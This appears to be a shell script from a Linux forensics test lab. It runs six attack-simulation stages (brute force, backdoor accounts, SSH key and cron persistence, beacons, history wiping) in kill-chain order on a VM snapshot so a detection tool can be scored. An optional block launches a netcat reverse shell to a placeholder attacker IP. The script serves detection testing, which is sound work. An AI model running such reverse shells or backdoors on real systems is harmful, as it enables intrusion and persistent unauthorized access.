#!/bin/sh
# chain.sh — the chained multi-incident case (PLAYBOOK section 5, "the finale").
#
# WHY A DRIVER, NOT JUST SIX SCRIPTS RUN BY HAND
#   Single incidents each prove one rule. The value of the chain is the
#   CORRELATIONS that only exist when the stages share one timeline and one
#   attacker IP: brute_force_success ties a success to a preceding burst,
#   persistence_after_login ties an SSH key / cron job to that same login, and
#   suspicious_process rises to High confidence when the payload ran within an
#   hour of it. Run the stages out of order, or on separate snapshots, and those
#   links do not form. This driver runs them in kill-chain order on ONE snapshot,
#   in one clock window, so the correlations are real — not staged.
#
#   It deliberately STOPS BEFORE COLLECTION. Collection has to happen after all
#   the activity and before any manual live analysis (your own commands would
#   contaminate the very artifacts the collector reads), so the driver hands you
#   the exact collect -> analyse -> verify -> score block to run next.
#
# ORDER (one external-attacker story):
#   1. 02  break in            brute-force burst + a success from the attacker IP
#   2. 01  foothold            off-hours privileged action from that IP
#   3. 05  escalate            backdoor accounts (uid0 / nopass / privileged group)
#   4. 07  persist             SSH key + cron beacon, planted just after the login
#   5. 06  execute             curl beacon / reverse-shell payloads
#   6. 03  anti-forensics      (optional 2nd actor) collect + wipe history
#
# METASPLOITABLE: works there too — every child routes its modern-only calls
#   (timeout, curl) through lib.sh's shims. auditd/journald simply produce
#   nothing on Hardy; the history / auth.log / passwd / cron paths carry the case.
#
# REPRODUCIBLE: YES. Snapshot first — combined blast radius of all stages.

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$DIR/lib.sh"
require_root "chain"
confirm_lab

# Confirm once here; children inherit this and do not prompt again.
export LFA_LAB_CONFIRM=yes

# Clock sanity: syslog carries no year, so the analyzer infers it from the log
# file mtime. A stale VM clock (Metasploitable ships thinking it is 2010) lands
# every injected event in the wrong year. Warn, do not silently roll the clock.
YEAR=$(date -u +%Y)
if [ "$YEAR" -lt 2020 ]; then
    echo "==============================================================="
    echo " [!] System clock reads year $YEAR. Syslog has no year, so the"
    echo "     analyzer will date every event to $YEAR. Set the real time"
    echo "     FIRST, e.g.:  sudo date -u -s \"$(date -u +%Y-%m-%dT%H:%M:%S | sed 's/^..../2026/')\""
    echo "     (or your real current UTC time), then re-run this driver."
    echo "==============================================================="
    [ "${LFA_IGNORE_CLOCK:-0}" = "1" ] || { echo "Aborted (set LFA_IGNORE_CLOCK=1 to override)."; exit 3; }
fi

CASE="${LFA_CASE:-CASE-CHAIN}"

run_stage() {
    _n=$1; _label=$2; _script=$3
    echo
    echo "==== kill-chain step $_n: $_label ($_script) ===="
    sh "$DIR/$_script"
}

# --- the kill chain, in order -------------------------------------------------
run_stage 1 "break in (brute force + success)"        02_brute_force_ssh.sh
run_stage 2 "foothold (off-hours privileged action)"  01_unauthorized_login.sh
run_stage 3 "escalate (backdoor accounts)"            05_privilege_escalation.sh
# Persistence uses NO local anchor: scenario 02 above already provided the
# brute-forced login that persistence_after_login correlates against.
run_stage 4 "persist (SSH key + cron beacon)"         07_persistence.sh
run_stage 5 "execute (C2 beacon + reverse shells)"    06_suspicious_process_execution.sh
run_stage 6 "anti-forensics (insider + history wipe)" 03_insider_activity.sh

# --- optional: leave a live reverse shell for the ps/netstat path -------------
# The connection to the non-routable attacker IP never completes, so the process
# just sits in connect() — which is exactly what makes `ps aux` (running_process)
# and netstat catch it at collection time. It will NOT self-terminate; kill it
# after you collect. Off by default because it leaves a process behind.
if [ "${LFA_LIVE_SHELL:-0}" = "1" ] && have nc; then
    echo
    echo "[*] LFA_LIVE_SHELL=1: leaving a live reverse shell for ps/netstat to catch..."
    nc -e /bin/sh "$ATTACKER_IP" 4444 >/dev/null 2>&1 &
    echo "    live reverse shell pid=$! -> kill it after you collect:  kill $!"
fi

cat <<EOF

===============================================================================
 CHAIN COMPLETE — all stages run on this one snapshot. DO NOT run manual
 analysis yet; collect first so your own commands do not contaminate evidence.
===============================================================================

 Next, on the TARGET (collect the bundle):

   sudo sh ../../collector/collect.sh -o /tmp/out -c $CASE -p "YourName" -z

 Then move /tmp/out/$CASE*.tar.gz to the EXAMINER machine and run:

   python -m lfa analyse $CASE*.tar.gz --case-dir cases/$CASE --examiner "YourName"
   python -m lfa verify  cases/$CASE

   # merge the per-stage ground truth for the stages this chain ran, then score:
   python - <<'PY'
   import json, glob
   threats=[]
   for f in sorted(glob.glob("testlab/scenarios/0[123567]_*.ground_truth.json")):
       threats += json.load(open(f)).get("injected_threats", [])
   json.dump({"scenario_name":"chained_incident","injected_threats":threats},
             open("testlab/scenarios/chain.ground_truth.json","w"), indent=2)
   print(f"merged {len(threats)} threats")
   PY
   python tools/score_detection.py --case-dir cases/$CASE \\
          --ground-truth testlab/scenarios/chain.ground_truth.json

 Emergent findings that appear ONLY because the stages share one timeline:
   brute_force_success        (success tied to the preceding burst)
   persistence_after_login    (SSH key + cron within 120 min of that login)
   suspicious_process HIGH    (payload within 60 min of the brute-forced login)
   first_seen                 (the attacker IP / new accounts appear only late)
===============================================================================
EOF
echo "[+] chain.sh complete (collection intentionally left to you)."
